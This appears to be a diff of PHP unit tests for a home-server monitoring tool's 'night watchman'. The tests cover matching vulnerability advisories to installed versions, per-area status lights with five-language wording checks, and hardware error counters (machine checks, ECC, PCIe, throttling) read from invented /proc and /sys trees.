+    $cases = [[$vk1, '9.1.2'], [$vk2, '9.1.2'], [$vk1, '8.1.3'], [$vk2, '8.1.3'], [$vk3, '8.1.3'], [$vk3, '9.1.2'], [$rd, '8.12.0'], [$vk4, '9.1.2'], [$vk4, '7.0.5'],
+              [$vk5, '9.1.2'], [$vk5, '8.1.3'], [$vk6, '8.1.3'], [$vk6, '9.0.1'], [$n8n, '2.48.5'], [$n8n, '2.48.1'], [$n8n, '3.1.0'], [$n8n, '2.40.0'],
+              [$vk1, '9.2.1'], [$vk1, '9.3.0'], [$nc, '33.0.5'], [$nc, '31.0.9'], [$nc, '35.0.1'], [$all, '8.0.1'], [$all, '8.12.0'],
+              [[['<= 9.1.1, <= 9.0.5'], ['TBD']], '9.2.0'], [[['All'], ['TBD']], '8.12.0'], [[['>= 7.2'], ['TBD']], '8.12.0'], [[['<= 9.1.3, <= 9.1.2'], ['9.1.4']], '9.1.0'],
+              [[['<= 8.0, <= 7.2.4'], ['8.1, 7.2.5']], '8.0.3']];
+    same('vuln advisory lines: per release line — its own line\'s bound and fix; newer than every line with a fix named: not affected; older, between, an rc line, TBD, two in a line: unsure',
+        [['yes', '9.1.4'], ['yes', '9.1.3'], ['yes', '8.1.12'], ['yes', '8.1.11'], ['yes', '8.1.10'], ['no', '9.1.2'], ['no', null], ['no', null], ['no', null],
+         ['no', null], ['yes', '8.1.4'], ['no', '9.0.3'], ['yes', '9.0.3'], ['no', '2.48.3'], ['yes', '2.48.3'], ['yes', '3.2.2'], 'maybe',
+         'maybe', ['no', null], ['yes', '33.0.7'], 'maybe', ['no', null], ['yes', '8.0.4'], ['no', null],
+         'maybe', 'maybe', 'maybe', 'maybe', ['maybe', null, 'rough', '8.0']],
+        array_map(function ($c) {
+            $v = watchmanVulnGhsaVerdict(['ranges' => $c[0][0], 'fixed' => $c[0][1]], $c[1]);
+            return $v[0] === 'maybe' && ($v[2] ?? null) === 'ghsa' ? 'maybe' : $v;
+        }, $cases));
+    same('vuln advisory lines: an unsure one keeps the advisory\'s own words', ['maybe', null, 'ghsa', '< 2.48.3 · < 2.47.6 · < 3.2.2'],
+        watchmanVulnGhsaVerdict(['ranges' => $n8n[0], 'fixed' => $n8n[1]], '2.40.0'));
+    same('vuln advisory lines: the words that mean a bound', ['<= 7.2.10, <= 8.0.5', '>= 8.1.4', '>=9.0.0, <= 9.0.2', '<=1.2', 'All'],
+        array_map('watchmanVulnGhsaWords', ['7.2.10 and below, 8.0.5 and below', '8.1.4 and above', '=>9.0.0, <= 9.0.2', '=<1.2', 'All']));
+
+    // words that can't be compared, with a CVE: its record decides, then NVD; nothing clean — unsure as before, saying so
+    $tmp = hardeningTmp('vuln-ghsa-cve');
+    $dir = "$tmp/data";
+    $f = watchmanVulnDir($dir);
+    foreach (['ghsa', 'cve', 'nvd'] as $d) {
+        @mkdir("$f/$d", 0700, true);
+    }
+    $t0 = strtotime('2026-11-26 12:00:00');
+    $item = fn (string $id, string $cve, string $range, string $fix) => ['id' => $id, 'cve' => $cve, 'sev' => 'high', 'ranges' => [$range], 'fixed' => [$fix], 'sum' => 'x', 'pub' => '2026-05-05'];
+    writeAtomic("$f/ghsa/redis.json", jsonEncode(['v' => 1, 'fetched' => $t0, 'repo' => 'redis/redis', 'looked' => 47, 'cut' => false, 'items' => [
+        $item('GHSA-c8h9-259x-jff4', 'CVE-2026-25243', 'All', 'TBD'), $item('GHSA-93m2-935m-8rj3', 'CVE-2026-23479', '>= 7.2', 'TBD'),
+        $item('GHSA-m8fj-85cg-7vhp', 'CVE-2025-46817', 'All', 'TBD'), $item('GHSA-rp2m-q4j6-gr43', 'CVE-2025-32023', '>= 2.8', 'TBD')]]), 0600, 0, 0);
+    $rec = fn (string $cve, array $versions) => ['v' => 1, 'fetched' => $t0, 'id' => $cve, 'published' => '2026-05-05',
+        'affected' => [['vendor' => 'redis', 'product' => 'redis', 'defaultStatus' => 'unaffected', 'versions' => $versions]]];
+    writeAtomic("$f/cve/CVE-2026-25243.json", jsonEncode($rec('CVE-2026-25243', [['version' => '8.0.0', 'lessThan' => '8.12.1', 'status' => 'affected', 'versionType' => 'semver']])), 0600, 0, 0);
+    writeAtomic("$f/cve/CVE-2026-23479.json", jsonEncode($rec('CVE-2026-23479', [['version' => '7.2.0', 'lessThan' => '8.10.2', 'status' => 'affected', 'versionType' => 'semver']])), 0600, 0, 0);
+    writeAtomic("$f/cve/CVE-2025-46817.json", jsonEncode($rec('CVE-2025-46817', [['version' => 'n/a', 'status' => 'affected']])), 0600, 0, 0);
+    writeAtomic("$f/nvd/CVE-2025-46817.json", jsonEncode(['v' => 1, 'fetched' => $t0, 'id' => 'CVE-2025-46817', 'affected' => [['vendor' => 'redis', 'product' => 'redis',
+        'defaultStatus' => 'unaffected', 'versions' => [['version' => '0', 'lessThan' => '8.2.2', 'status' => 'affected', 'versionType' => 'custom']]]]]), 0600, 0, 0);
+    $inv = [['product' => 'redis', 'version' => '8.12.0', 'clean' => '8.12.0', 'where' => 'cache']];
+    $j = watchmanVulnGhsaJudge($dir, $inv, $t0 + 60);
+    same('vuln advisory lines: by the CVE — the record says affected (fixed from 8.12.1), the record says fixed, NVD says fixed; no record yet: unsure as before, nothing asked',
+        [[['GHSA-c8h9-259x-jff4', 'yes', '8.12.1', 'cve']], [['GHSA-rp2m-q4j6-gr43', 'maybe', false, false]]],
+        [array_map(fn ($x) => [$x['id'], $x['verdict'], $x['fixed'], $x['src'] ?? null], array_filter($j['ghsa'], fn ($x) => $x['verdict'] === 'yes')),
+         array_values(array_map(fn ($x) => [$x['id'], $x['verdict'], $x['rec'] ?? null, $x['nvd'] ?? null], array_filter($j['ghsa'], fn ($x) => $x['verdict'] === 'maybe')))]);
+    // the job: the advisories' CVEs wanted after the exploited list's — also the ones their record settled (else the record
+    // would go and the row come back); NVD asked for the one its record can't settle, after the list's own unsure ones
+    $look = ['cts' => [['where' => 'cache', 'product' => 'redis', 'version' => '8.12.0', 'clean' => '8.12.0']]];
+    same('vuln advisory lines: wanted by the job — every advisory CVE whose words can\'t be compared, settled or not', ['CVE-2026-25243', 'CVE-2026-23479', 'CVE-2025-46817', 'CVE-2025-32023'],
+        watchmanVulnGhsaCves($f, $look));
+    @unlink("$f/nvd/CVE-2025-46817.json");
+    same('vuln advisory lines: NVD for those whose record can\'t settle them (or was asked and didn\'t come)', ['CVE-2025-46817', 'CVE-2025-32023'],
+        watchmanVulnGhsaNvd($f, $look, ['CVE-2025-32023' => $t0]));
+    writeAtomic("$dir/state.json", jsonEncode(['vuln_look' => $look + ['unsure' => [['cve' => 'CVE-2024-99999', 'product' => 'kernel']]]]), 0600, 0, 0);
+    $asked = [];
+    $kevBig = ['vulnerabilities' => array_merge([['cveID' => 'CVE-2024-99999', 'vendorProject' => 'Linux', 'product' => 'Kernel']],
+        array_map(fn ($i) => ['cveID' => sprintf('CVE-2023-%05d', 50000 + $i), 'vendorProject' => 'Example', 'product' => "X$i"], range(1, 120)))];
+    watchmanVulnFetch($dir, ['now' => $t0 + 86400, 'sleep' => fn () => null, 'ghsa_products' => [], 'get' => function (string $url) use (&$asked, $kevBig): array {
+        $asked[] = $url;
+        return $url === WATCH_VULN_URLS['kev'] ? ['code' => 200, 'body' => json_encode($kevBig), 'lm' => null, 'err' => null] : ['code' => 404, 'body' => '', 'lm' => null, 'err' => 'HTTP 404'];
+    }]);
+    $ids = fn (string $part) => array_values(array_map(fn ($u) => preg_replace('/^.*(CVE-\d{4}-\d+).*$/', '$1', $u), array_filter($asked, fn ($u) => str_contains($u, $part))));
+    same('vuln advisory lines, the job: records — the exploited list\'s first, then the advisories\' not here yet; NVD — the list\'s unsure first, then the advisory\'s; the settled records kept',
+        [['CVE-2024-99999', 'CVE-2025-32023'], ['CVE-2024-99999', 'CVE-2025-46817', 'CVE-2025-32023'], true, true],
+        [$ids('cvelistV5'), $ids('nvd.nist.gov'), is_file("$f/cve/CVE-2026-25243.json"), is_file("$f/cve/CVE-2026-23479.json")]);
+}
+
+/**
+ * The night watchman's areas (1.96 step 1, agent/desks/watchman-cats.php): every kind of his book and every posture tip
+ * in exactly one area, the 19 areas in the page's order; the lights as a table of cases (open and important, open,
+ * what an area couldn't see, advice not known, info never, grey for what isn't there); an old state.json without the
+ * new round keys; the page state carries `cats`, `cats_cross` and each entry's `cat`; his files' sizes, the metric.
+ */
+function testWatchmanCats(): void
+{
+    same('cats: the 19 areas in the page\'s order', ['login', 'container', 'plugin', 'flash', 'share', 'sched', 'pull', 'data', 'snap', 'host', 'door',
+        'partner', 'router', 'lan', 'array', 'vuln', 'hw', 'hold', 'wakes'], array_keys(WATCH_CATS));
+    // gap 4 (concept 12.1): every reason a light gives (cat.why.<code>) has its words in five languages — the page shows a
+    // reason only when it has words; the counts (open, open_tell, tips) are said by their own lines
+    preg_match_all('/\$add\([^,]+,\s*\'[a-z]+\',\s*\'([a-z_]+)\'\)/', (string) file_get_contents(OFFICE_DIR . '/agent/desks/watchman-cats.php'), $why);
+    $whyMissing = [];
+    foreach (['en', 'de', 'it', 'fr', 'es'] as $code) {
+        $lang = langFile(OFFICE_WEB . "/desks/watchman/lang/$code.json");
+        foreach (array_diff(array_unique($why[1]), ['open', 'open_tell', 'tips']) as $w) {
+            $words = $lang["cat.why.$w"] ?? null;          // a sentence, or a plural (one/other: a re-learned data flow's days)
+            if (!is_string($words) && !(is_array($words) && is_string($words['one'] ?? null) && is_string($words['other'] ?? null))) {
+                $whyMissing[] = "$code cat.why.$w";
+            }
+        }
+    }
+    same('cats: every reason a light gives has its words in five languages (hardware, known vulnerabilities too)', [true, []],
+        [count($why[1]) > 20, $whyMissing]);
+    $kinds = array_merge(...array_column(WATCH_CATS, 'kinds'));
+    $tips = array_merge(...array_column(WATCH_CATS, 'tips'));
+    same('cats: every kind of his book in exactly one area', [[], []],
+        [array_values(array_diff(array_keys(WATCH_KINDS), $kinds)), array_keys(array_filter(array_count_values($kinds), fn ($n) => $n > 1))]);
+    same('cats: … and no area names a kind he doesn\'t have', [], array_values(array_diff($kinds, array_keys(WATCH_KINDS))));
+    same('cats: every posture tip in exactly one area, none he doesn\'t have', [[], [], []],
+        [array_values(array_diff(array_keys(WATCH_POSTURE), $tips)), array_keys(array_filter(array_count_values($tips), fn ($n) => $n > 1)),
+         array_values(array_diff($tips, array_keys(WATCH_POSTURE)))]);
+    same('cats: as the concept puts them — SMB at the logins, the RAM accounts with the flash, API keys among the ways in, the router\'s clock at the router',
+        ['login', 'login', 'flash', 'door', 'door', 'router', 'lan', 'share', 'container', null],
+        [watchmanCatOf('smb_user'), watchmanCatOf('smb_hour'), watchmanCatOf('user_ram'), watchmanCatOf('api_key_new'), watchmanCatOfTip('upnp'),
+         watchmanCatOfTip('router_clock'), watchmanCatOf('net_spoof'), watchmanCatOfTip('flash'), watchmanCatOfTip('privileged'), watchmanCatOf('watch')]);
+
+    // the lights: a state as his page gets it, one area at a time
+    $now = 1790000000;
+    $base = ['time' => $now, 'hired' => true, 'on_watch' => $now - 86400 * 30,
+             'round' => ['last' => $now - 60, 'failed' => false, 'docker' => true, 'shares' => true, 'flow' => true, 'snaps' => true, 'syslog_full' => null, 'broken' => null],
+             'book' => [], 'posture' => ['tips' => []], 'flow' => ['days' => 20, 'learn' => 7], 'snaps' => ['failed' => false, 'capped' => [], 'asleep' => []],
+             'net' => ['state' => 'on', 'senders' => [['sender' => 'udm']]],
+             'hold' => ['running' => false, 'look' => ['time' => $now - 100, 'started' => true, 'count' => 0, 'cut' => false, 'times' => ['fits' => true]]],
+             'wakes' => ['on' => true, 'hdds' => ['disk1'], 'wakes' => []]];
+    $e = fn (string $kind, bool $open, bool $tell, array $p = []) => ['id' => substr(md5($kind . $open . $tell), 0, 12), 'kind' => $kind, 'time' => $now - 500,
+        'last' => $now - 400, 'open' => $open, 'tell' => $tell, 'p' => $p];
+    $light = function (array $change, string $cat, ?array $parity = null) use ($base): array {
+        $c = watchmanCats(array_replace_recursive($base, $change), $parity);
+        return [$c['areas'][$cat]['level'], $c['areas'][$cat]['why']];
+    };
+    $all = watchmanCats($base);
+    same('lights: all looked at, nothing open — green, but the two new areas and nothing else grey', ['vuln' => 'none', 'hw' => 'none'],
+        array_filter(array_map(fn (array $a): string => $a['level'], $all['areas']), fn ($l) => $l !== 'ok'));
+    same('lights: the watch book takes the worst area that looks at something, the schedule its last round', ['ok', 'ok'], [$all['book'], $all['schedule']]);
+    $cases = [
+        // [what, change, area, parity, level, why]
+        ['an open important entry: red', ['book' => [$e('login_new_ip', true, true)]], 'login', null, 'danger', ['open_tell']],
+        ['open, none important: yellow', ['book' => [$e('smb_client', true, false)]], 'login', null, 'warn', ['open']],
+        ['noted only: green, counted', ['book' => [$e('login_new_ip', false, true)]], 'login', null, 'ok', []],
+        ['the syslog full: he sees no logins — yellow', ['round' => ['syslog_full' => ['free' => 0, 'total' => 1]]], 'login', null, 'warn', ['syslog_full']],
+        ['Docker didn\'t answer: grey', ['round' => ['docker' => false]], 'container', null, 'none', ['docker_off']],
+        ['… but an open entry from before still shows', ['round' => ['docker' => false], 'book' => [$e('container_new', true, true)]], 'container', null, 'danger', ['open_tell', 'docker_off']],
+        ['emhttp didn\'t answer: green with «!»', ['round' => ['shares' => false]], 'share', null, 'note', ['shares_silent']],
+        ['advice not known yet: green with «!»', ['posture' => ['tips' => [['id' => 'upnp', 'level' => 'advice', 'known' => false]]]], 'door', null, 'note', ['tips']],
+        ['advice known: green', ['posture' => ['tips' => [['id' => 'upnp', 'level' => 'advice', 'known' => true]]]], 'door', null, 'ok', []],
+        ['an info tip never colours', ['posture' => ['tips' => [['id' => 'privileged', 'level' => 'info', 'known' => false]]]], 'container', null, 'ok', []],
+        ['the data flow still learning', ['flow' => ['days' => 3]], 'data', null, 'note', ['learning']],
+        ['… the data flow not looked at', ['round' => ['flow' => false]], 'pull', null, 'note', ['flow_silent']],
+        ['ZFS failed: yellow', ['snaps' => ['failed' => true]], 'snap', null, 'warn', ['snaps_failed']],
+        ['a pool over the cap: yellow', ['snaps' => ['capped' => ['tank']]], 'snap', null, 'warn', ['snaps_capped']],
+        ['a pool asleep: green with «!»', ['snaps' => ['asleep' => ['tank']]], 'snap', null, 'note', ['asleep']],
+        ['no syslog server: the router grey', ['net' => ['state' => 'off']], 'router', null, 'none', ['no_router']],
+        ['… the network too', ['net' => ['state' => 'off']], 'lan', null, 'none', ['no_router']],
+        ['its share asleep: yellow', ['net' => ['state' => 'asleep']], 'lan', null, 'warn', ['router_asleep']],
+        ['an unclean stop: yellow', [], 'array', ['todo' => ['streak' => 1]], 'warn', ['parity_todo']],
+        ['… the second in a row: red', [], 'array', ['todo' => ['streak' => 2]], 'danger', ['parity_again']],
+        ['a check that ended with errors: red', ['book' => [$e('parity_check', false, false, ['end' => $now - 300, 'errors' => 3])]], 'array', null, 'danger', ['parity_errors']],
+        ['… without errors: green', ['book' => [$e('parity_check', false, false, ['end' => $now - 300, 'errors' => 0])]], 'array', null, 'ok', []],
+        ['the shutdown time-out too short: red', ['hold' => ['look' => ['times' => ['fits' => false]]]], 'hold', null, 'danger', ['hold_short']],
+        ['something holds the array: yellow', ['hold' => ['look' => ['count' => 2]]], 'hold', null, 'warn', ['hold_holds']],
+        // only what still waits for you colours (Benj on the test stand, 1.96): a User Script you said may run, a VM without the
+        // guest agent you know — green; one of them not known (or a thing not markable: a shell) — yellow
+        ['all it holds known (a User Script, a VM without agent): green', ['hold' => ['look' => ['count' => 2,
+            'holds' => [['kind' => 'userscript', 'name' => 'sync']], 'vms' => [['name' => 'Win11', 'agent' => 'none'], ['name' => 'HA', 'agent' => 'connected']]]],
+            'rules' => [['cat' => 'hold', 'on' => ['script' => 'sync']], ['cat' => 'hold', 'on' => ['vm' => 'Win11']]]], 'hold', null, 'ok', []],
+        ['… the VM not known: yellow', ['hold' => ['look' => ['count' => 2,
+            'holds' => [['kind' => 'userscript', 'name' => 'sync']], 'vms' => [['name' => 'Win11', 'agent' => 'none']]]],
+            'rules' => [['cat' => 'hold', 'on' => ['script' => 'sync']]]], 'hold', null, 'warn', ['hold_holds']],
+        ['… a shell holding it (never markable): yellow', ['hold' => ['look' => ['count' => 2,
+            'holds' => [['kind' => 'shell', 'via' => 'ssh']], 'vms' => [['name' => 'Win11', 'agent' => 'disconnected']]]],
+            'rules' => [['cat' => 'hold', 'on' => ['vm' => 'Win11']]]], 'hold', null, 'warn', ['hold_holds']],
+        ['… a known VM with a running guest agent counts nothing twice', ['hold' => ['look' => ['count' => 0, 'vms' => [['name' => 'HA', 'agent' => 'connected']]]],
+            'rules' => [['cat' => 'hold', 'on' => ['vm' => 'HA']]]], 'hold', null, 'ok', []],
+        ['a look a day old: green with «!»', ['hold' => ['look' => ['time' => $now - 2 * 86400]]], 'hold', null, 'note', ['hold_old']],
+        ['… looked in part: likewise', ['hold' => ['look' => ['cut' => true]]], 'hold', null, 'note', ['hold_cut']],
+        ['the array stopped: grey', ['hold' => ['look' => ['started' => false]]], 'hold', null, 'none', ['array_stopped']],
+        ['never looked: grey', ['hold' => ['look' => null]], 'hold', null, 'none', ['hold_never']],
+        ['wakes switched off: grey', ['wakes' => ['on' => false]], 'wakes', null, 'none', ['wakes_off']],
+        ['wakes not rated: green however many', ['wakes' => ['wakes' => array_fill(0, 30, ['id' => 'x'])]], 'wakes', null, 'ok', []],
+    ];
+    foreach ($cases as [$what, $change, $cat, $parity, $level, $why]) {
+        same("lights: $cat — $what", [$level, $why], $light($change, $cat, $parity));
+    }
+    $flash = watchmanCats(array_replace($base, ['wakes' => ['on' => true, 'hdds' => [], 'wakes' => []]]))['areas']['wakes'];
+    same('lights: wakes — no spinning disk: grey', ['none', ['no_hdd']], [$flash['level'], $flash['why']]);
+    $red = watchmanCats(array_replace_recursive($base, ['book' => [$e('door_new', true, true)], 'round' => ['failed' => true]]));
+    same('lights: one red area makes the watch book red; a failed round the schedule', ['danger', 'danger', 1, 1, $now - 400],
+        [$red['book'], $red['schedule'], $red['areas']['door']['open'], $red['areas']['door']['tell'], $red['areas']['door']['last']]);
+    $grey = watchmanCats(array_replace($base, ['on_watch' => null, 'book' => [$e('plugin_new', true, true)]]));
+    same('lights: before his first round grey («never»), an open entry from an earlier watch still red', ['none', ['never'], 'danger', 'danger'],
+        [$grey['areas']['login']['level'], $grey['areas']['login']['why'], $grey['areas']['plugin']['level'], $grey['book']]);
+    $off = watchmanCats(array_replace($base, ['hired' => false]));
+    same('lights: not hired — every area grey', [['none'], 'none'], [array_values(array_unique(array_column($off['areas'], 'level'))), $off['book']]);
+    $old = watchmanCats(['time' => $now, 'hired' => true, 'on_watch' => $now, 'round' => ['last' => $now], 'book' => []]);
+    same('lights: a state of an older office (no flow, snaps, net, hold, wakes in it): no warning, what isn\'t there grey',
+        ['ok', 'ok', 'none', 'none', 'none'], [$old['areas']['login']['level'], $old['areas']['snap']['level'], $old['areas']['router']['level'],
+         $old['areas']['hold']['level'], $old['areas']['wakes']['level']]);
+
+    // the page state: cats, each entry's area, his files' sizes; the metric
+    $tmp = hardeningTmp('watch-cats');
+    mkdir("$tmp/watchman", 0700, true);
+    file_put_contents("$tmp/watchman/book.json", json_encode(['entries' => [
+        ['id' => 'aaaaaaaaaaaa', 'kind' => 'login_new_ip', 'key' => 'ip:203.0.113.7', 'time' => $now - 100, 'last' => $now - 50, 'count' => 1, 'p' => ['ip' => '203.0.113.7']]]]));
+    file_put_contents("$tmp/watchman/state.json", json_encode(['round' => ['time' => $now - 60, 'docker' => true, 'shares' => true]]));
+    $page = watchmanPageState("$tmp/watchman", $now, false);
+    same('page state: each entry\'s area; the lights; his files\' sizes in the round', ['login', true, true, true, filesize("$tmp/watchman/book.json"), 0],
+        [$page['book'][0]['cat'] ?? null, isset($page['cats']['login']['level'], $page['cats']['wakes']), isset($page['cats_cross']['book'], $page['cats_cross']['schedule']),
+         array_keys($page['round']['sizes'] ?? []) === WATCH_CAT_FILES, $page['round']['sizes']['book'] ?? null, $page['round']['sizes']['flow'] ?? null]);
+    same('page state: each posture tip carries its area (its «advice» in that area\'s section)', ['door', 'container'],
+        array_column(watchmanPosturePage(['tips' => [['id' => 'upnp'], ['id' => 'privileged']]], null)['tips'] ?? [], 'cat'));
+    $m = array_values(array_filter(watchmanMetrics("$tmp/watchman"), fn ($f) => $f['name'] === 'uso_watchman_file_bytes'))[0] ?? null;
+    same('metric: his files\' sizes, one sample per file', [count(WATCH_CAT_FILES), ['file' => 'book'], filesize("$tmp/watchman/book.json")],
+        [count($m['samples'] ?? []), $m['samples'][0][0] ?? null, $m['samples'][0][1] ?? null]);
+    hardeningRm($tmp);
+}
+
+/**
+ * The night watchman's hardware (1.96 step 9, agent/desks/watchman-hw.php) on invented /proc and /sys trees: what a server
+ * doesn't have is «not available» (null), never 0; the first look is normal; machine checks (never MCP); memory errors per
+ * module (corrected: quiet, ten a day or one not corrected: told), what a controller couldn't put on a module, the day's
+ * count; PCIe (corrected above 100 an hour: quiet, once an hour; not correctable: told); throttling; the kernel's flags since
+ * the boot's first look; a reboot counts from 0 (a counter at 0 is no drop, a lower one no negative); the night shift and
+ * the day share this boot's counters (nothing told twice); his area's light; no chain, no technique; the words in five
+ * languages; a whole round with it (the entries in book-more.json, the page's part).
+ */
+function testWatchmanHw(): void
+{
+    $tmp = hardeningTmp('watch-hw');
+    $hw = "$tmp/hw";
+    $paths = ['hw' => ['interrupts' => "$hw/interrupts", 'edac' => "$hw/edac", 'pci' => "$hw/pci", 'cpus' => "$hw/cpus", 'tainted' => "$hw/tainted",
+                       'ram' => "$tmp/ram/watchman-hw.json"], 'hw_file' => "$tmp/data/hw.json"];
+    @mkdir("$tmp/data", 0700, true);
+    $put = function (string $file, string $text) use ($hw): void {
+        @mkdir(dirname("$hw/$file"), 0755, true);
+        file_put_contents("$hw/$file", $text);
+    };
+    $col = fn (int $a, int $b = 0) => sprintf('%11d%11d', $a, $b);
+    $irq = fn (int $mce, int $mcp = 7, ?int $thr = null) => $put('interrupts', "            CPU0       CPU1\n   0:" . $col(36) . "   IO-APIC   2-edge      timer\n"
+        . 'NMI:' . $col(0) . "   Non-maskable interrupts\nMCE:" . $col(intdiv($mce, 2), $mce - intdiv($mce, 2)) . "   Machine check exceptions\n"
+        . 'MCP:' . $col($mcp, $mcp) . "   Machine check polls\n" . ($thr === null ? '' : 'THR:' . $col($thr) . "   Threshold APIC interrupts\n")
+        . "ERR:          0\nMIS:          0\n");
+    $ecc = function (array $dimms, int $more = 0, int $moreUe = 0) use ($put): void {        // id => [ce, ue, label]; $more: the controller's beyond them
+        $put('edac/mc0/mc_name', "ie31200\n");
+        $put('edac/mc0/ce_count', (array_sum(array_column($dimms, 0)) + $more) . "\n");
+        $put('edac/mc0/ue_count', (array_sum(array_column($dimms, 1)) + $moreUe) . "\n");
+        foreach ($dimms as $id => [$ce, $ue, $label]) {
+            $put("edac/mc0/$id/dimm_ce_count", "$ce\n");
+            $put("edac/mc0/$id/dimm_ue_count", "$ue\n");
+            $put("edac/mc0/$id/dimm_label", "$label\n");
+        }
+    };
+    $aer = function (int $cor, int $nonfatal = 0, int $fatal = 0) use ($put, $hw): void {
+        $put('pci/0000:01:00.0/aer_dev_correctable', "RxErr $cor\nBadTLP 0\nBadDLLP 0\nRollover 0\nTimeout 0\nNonFatalErr 0\nCorrIntErr 0\nHeaderOF 0\nTOTAL_ERR_COR $cor\n");
+        $put('pci/0000:01:00.0/aer_dev_nonfatal', "Undefined 0\nDLP 0\nTOTAL_ERR_NONFATAL $nonfatal\n");
+        $put('pci/0000:01:00.0/aer_dev_fatal', "Undefined 0\nDLP 0\nTOTAL_ERR_FATAL $fatal\n");
+        @mkdir("$hw/drivers/nvme", 0755, true);
+        if (!is_link("$hw/pci/0000:01:00.0/driver")) {
+            symlink("$hw/drivers/nvme", "$hw/pci/0000:01:00.0/driver");
+        }
+    };
+    $throttle = function (int $core, int $pkg) use ($put): void {
+        $put('cpus/cpu0/thermal_throttle/core_throttle_total_time_ms', "$core\n");
+        $put('cpus/cpu0/thermal_throttle/package_throttle_total_time_ms', "$pkg\n");
+        $put('cpus/cpu1/thermal_throttle/core_throttle_total_time_ms', "0\n");
+    };
+    $taint = fn (int $n) => $put('tainted', "$n\n");
+    $book = [];
+    $bootA = 'aaaaaaaa-1111-2222-3333-444444444444';
+    $bootB = 'bbbbbbbb-1111-2222-3333-444444444444';
+    $round = function (int $now, string $boot, bool $day = true, ?int $btime = null) use (&$book, $paths): array {
+        $p = $day ? $paths : array_diff_key($paths, ['hw_file' => 1]);
+        return watchmanHwRound($p, watchmanHwLook($p['hw']), $boot, $btime, false, $now, $book);
+    };
+    $anew = function () use (&$book, $paths, $hw): void {        // a scenario of its own: no RAM, no hw.json, an empty book, no tree
+        $book = [];
+        @unlink($paths['hw']['ram']);
+        @unlink($paths['hw_file']);
+        exec('rm -rf ' . escapeshellarg($hw));
+    };
+    $entry = function (string $key) use (&$book): ?array {
+        return array_values(array_filter($book, fn ($e) => $e['key'] === $key && watchmanOpen($e)))[0] ?? null;
+    };
+    $now = 1790000000;
+
+    // nothing there: not available, never 0
+    same('look: nothing there — every part not available (null), never 0', ['mce' => null, 'edac' => null, 'aer' => null, 'throttle' => null, 'taint' => null],
+        watchmanHwLook($paths['hw']));
+    $sum = watchmanHwSummary(watchmanHwLook($paths['hw']), null, $now);
+    same('look: … the page says so', [null, null, null, null, null], [$sum['mce'], $sum['ecc'], $sum['aer'], $sum['throttle'], $sum['kernel']]);
+    // where a look starts
+    $ram = ['v' => 1, 'boot' => $bootA, 'last' => []];
+    same('start: taken over anew — normal; this boot\'s RAM — on from it; another boot after a watch — from 0; the first look ever — normal',
+        ['look', 'ram', 'zero', 'look', 'look'],
+        [watchmanHwStart($ram, $bootA, true, null, true, null, $now), watchmanHwStart($ram, $bootA, false, ['boot' => $bootA], true, null, $now),
+         watchmanHwStart($ram, $bootB, false, ['boot' => $bootA], true, null, $now), watchmanHwStart(null, $bootA, false, null, true, null, $now),
+         watchmanHwStart(null, $bootA, false, ['boot' => $bootA], true, null, $now)]);
+    same('start: the night shift — from 0 right after a start, normal long after it (no RAM), on from this boot\'s RAM',
+        ['zero', 'look', 'ram', 'look'],
+        [watchmanHwStart(null, $bootB, false, null, false, $now - 300, $now), watchmanHwStart(null, $bootB, false, null, false, $now - 86400, $now),
+         watchmanHwStart($ram, $bootA, false, null, false, $now - 86400, $now), watchmanHwStart(null, $bootB, false, null, false, null, $now)]);
+
+    // the first look: normal, whatever the counters say
+    $irq(0);
+    $ecc(['dimm0' => [2, 0, 'DIMM_A1'], 'dimm1' => [0, 0, 'DIMM_B1']]);
+    $aer(5);
+    $throttle(1000, 2000);
+    $taint(4096 | 8192);
+    $look = watchmanHwLook($paths['hw']);
+    same('look: the counters — MCE summed over the CPUs (no THR without AMD), the modules with their labels, the device with its driver, the busiest CPU, the flags',
+        [['mce' => 0, 'thr' => null, 'dfr' => null], ['DIMM_A1', 2, 0], ['cor' => 5, 'nonfatal' => 0, 'fatal' => 0, 'driver' => 'nvme'], ['core' => 1000, 'pkg' => 2000], 12288],
+        [$look['mce'], [$look['edac']['mc0']['dimms']['dimm0']['label'] ?? null, $look['edac']['mc0']['ce'] ?? null, $look['edac']['mc0']['ue'] ?? null],
+         $look['aer']['0000:01:00.0'] ?? null, $look['throttle'], $look['taint']]);
+    [$a, $s] = $round($now, $bootA);
+    same('first look: nothing told, counted from here; this boot in RAM, his hw.json names it', [[], 'look', true, $bootA],
+        [$a, $s['start'], is_file($paths['hw']['ram']), readJson($paths['hw_file'])['boot'] ?? null]);
+    // machine checks: MCP grows by itself — never; MCE: any rise, told
+    $irq(0, 999);
+    same('machine checks: the routine polls (MCP) grow — nothing', [], $round($now + 300, $bootA)[0]);
+    $irq(1);
+    same('machine checks: one — hw_mce, told (its kind), one entry per boot', [['hw_mce'], true, 'MCE 1'],
+        [$round($now + 600, $bootA)[0], watchmanImportant($entry('hw_mce:aaaaaaaa') ?? []), watchmanHwText($entry('hw_mce:aaaaaaaa') ?? ['kind' => 'hw_mce'])['counts'] ?? null]);
+    $irq(3, 999, 2);
+    same('machine checks: more (and AMD\'s THR) — the open entry brought up to date', [[], 'MCE 3 · THR 2'],
+        [$round($now + 900, $bootA)[0], watchmanHwText($entry('hw_mce:aaaaaaaa') ?? [])['counts'] ?? null]);
+    // memory errors
+    $ecc(['dimm0' => [5, 0, 'DIMM_A1'], 'dimm1' => [0, 0, 'DIMM_B1']]);
+    $a = $round($now + 1200, $bootA)[0];
+    $e = $entry('hw_ecc:aaaaaaaa:mc0/dimm0');
+    same('memory: three corrected on a module — a quiet line with its name and the day\'s count', [['hw_ecc'], false, 3, 'DIMM_A1 (mc0/dimm0)', null],
+        [$a, watchmanImportant($e ?? []), $e['p']['day'] ?? null, watchmanHwText($e ?? [])['where'] ?? null, watchmanHwVariant($e ?? [])]);
+    $ecc(['dimm0' => [12, 0, 'DIMM_A1'], 'dimm1' => [0, 0, 'DIMM_B1']]);
+    $a = $round($now + 1500, $bootA)[0];
+    same('memory: ten in a day on one module — the same entry, told now', [[], true, 10], [$a, watchmanImportant($entry('hw_ecc:aaaaaaaa:mc0/dimm0') ?? []),
+        $entry('hw_ecc:aaaaaaaa:mc0/dimm0')['p']['day'] ?? null]);
+    $ecc(['dimm0' => [12, 0, 'DIMM_A1'], 'dimm1' => [0, 1, 'DIMM_B1']]);
+    $a = $round($now + 1800, $bootA)[0];
+    $e = $entry('hw_ecc:aaaaaaaa:mc0/dimm1');
+    same('memory: one not corrected — told at once, its own words', [['hw_ecc'], true, 'hw_ecc_ue'], [$a, watchmanImportant($e ?? []), watchmanHwVariant($e ?? [])]);
